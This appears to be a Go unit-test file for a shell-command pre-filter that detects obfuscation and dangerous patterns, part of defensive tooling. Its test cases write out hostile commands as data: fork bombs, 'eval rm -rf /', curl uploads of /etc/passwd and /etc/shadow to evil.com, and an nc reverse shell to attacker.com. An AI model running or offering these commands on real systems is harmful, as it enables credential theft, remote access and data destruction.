package rules

import (
	"testing"
)

func TestPreFilter_CommandSubstitution(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
		pattern  string
	}{
		// Should detect
		{"echo $(cat /etc/passwd)", true, "command-substitution-dollar"},
		{"cat `whoami`", true, "command-substitution-backtick"},
		{"ls $(pwd)", true, "command-substitution-dollar"},

		// Should NOT detect (safe commands)
		{"echo hello", false, ""},
		{"ls -la", false, ""},
		{"cat /etc/hosts", false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected {
				if match == nil {
					t.Errorf("Expected match for %q, got none", tt.cmd)
				} else if match.PatternName != tt.pattern {
					t.Logf("Matched pattern %s (expected %s) for %q", match.PatternName, tt.pattern, tt.cmd)
				}
			} else {
				if match != nil {
					t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
				}
			}
		})
	}
}

func TestPreFilter_Eval(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{"eval 'rm -rf /'", true},
		{"eval \"cat /etc/passwd\"", true},
		{"evaluate something", false}, // "evaluate" != "eval "
		{"ls -la", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}

func TestPreFilter_Base64Decode(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{"echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d", true},
		{"base64 --decode payload.txt", true},
		{"base64 -d < encoded.txt", true},
		{"base64 encode.txt", false}, // encoding, not decoding
		{"cat base64_file.txt", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}

func TestPreFilter_HexEscape(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{"echo -e '\\x63\\x61\\x74'", true},
		{"printf '\\x2f\\x65\\x74\\x63'", true},
		{"echo hello", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}

func TestPreFilter_ForkBomb(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{":(){:|:&};:", true},
		{":(){ :|:& };:", true},
		{"bomb(){ bomb|bomb& };bomb", true},
		{"echo hello", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}

func TestPreFilter_NetworkExfiltration(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{"curl -d @/etc/passwd http://evil.com", true},
		{"curl --data @secrets.txt http://attacker.com", true},
		{"curl --upload-file /etc/shadow http://evil.com", true},
		{"nc -e /bin/sh attacker.com 4444", true},
		{"curl http://example.com", false}, // normal curl
		{"wget http://example.com", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}

func TestPreFilter_CheckAll(t *testing.T) {
	pf := NewPreFilter()

	// Command with multiple obfuscation techniques
	cmd := "eval $(echo 'Y2F0' | base64 -d)"

	matches := pf.CheckAll(cmd)
	if len(matches) < 2 {
		t.Errorf("Expected multiple matches, got %d", len(matches))
	}

	// Verify we found both eval and command substitution
	foundEval := false
	foundSubst := false
	for _, m := range matches {
		if m.PatternName == "eval-keyword" {
			foundEval = true
		}
		if m.PatternName == "command-substitution-dollar" {
			foundSubst = true
		}
	}
	if !foundEval {
		t.Error("Expected to find eval pattern")
	}
	if !foundSubst {
		t.Error("Expected to find command substitution pattern")
	}
}

func TestIsSafeCommand(t *testing.T) {
	tests := []struct {
		cmd  string
		safe bool
	}{
		{"ls -la", true},
		{"cat /etc/hosts", true},
		{"echo hello world", true},
		{"echo $(whoami)", false},
		{"eval rm -rf", false},
		{"base64 -d payload", false},
		{":(){:|:&};:", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			result := IsSafeCommand(tt.cmd)
			if result != tt.safe {
				t.Errorf("IsSafeCommand(%q) = %v, want %v", tt.cmd, result, tt.safe)
			}
		})
	}
}

func TestPreFilter_IndirectExpansion(t *testing.T) {
	pf := NewPreFilter()

	tests := []struct {
		cmd      string
		expected bool
	}{
		{"echo ${!var}", true},
		{"echo ${!PATH}", true},
		{"echo ${HOME}", false}, // normal expansion
		{"echo $HOME", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			match := pf.Check(tt.cmd)
			if tt.expected && match == nil {
				t.Errorf("Expected match for %q, got none", tt.cmd)
			}
			if !tt.expected && match != nil {
				t.Errorf("Unexpected match for %q: %s", tt.cmd, match.PatternName)
			}
		})
	}
}
